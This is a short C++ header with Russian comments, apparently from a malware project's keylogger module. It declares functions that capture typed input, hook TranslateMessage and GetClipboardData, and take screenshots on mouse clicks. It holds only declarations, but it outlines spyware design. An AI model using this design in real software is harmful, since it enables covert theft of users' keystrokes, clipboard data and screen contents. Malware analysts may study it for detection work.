/*
  Перехват ввода пользователя.
*/
#pragma once

namespace UserHook
{
#if BO_KEYLOGGER > 0
  /*
    Инициализация.
  */
  void init(void);

  /*
    Деинициализация.
  */
  void uninit(void);
  
  /*
    Очистка буфера ввода пользователя.
  */
  void clearInput(void);

  /*
    Получение текущей истории ввода.

    OUT buffer - буфер, необходимо освободить через Mem.

    Return     - 0 - если буфер пусть, *buffer будет равен NULL.
                 >0 - размер buffer в символах, исключая нулевой символ.
  */
  DWORD getInput(LPWSTR *buffer);

  void enableImageOnClick(WORD clicksCount, LPSTR filePrefix);
  
  /*
    Перехватчик TranslateMessage.
  */
  BOOL WINAPI hookerTranslateMessage(const MSG *msg);

  /*
    Перехватчик GetClipboardData.
  */
  HANDLE WINAPI hookerGetClipboardData(UINT format);


#endif

};
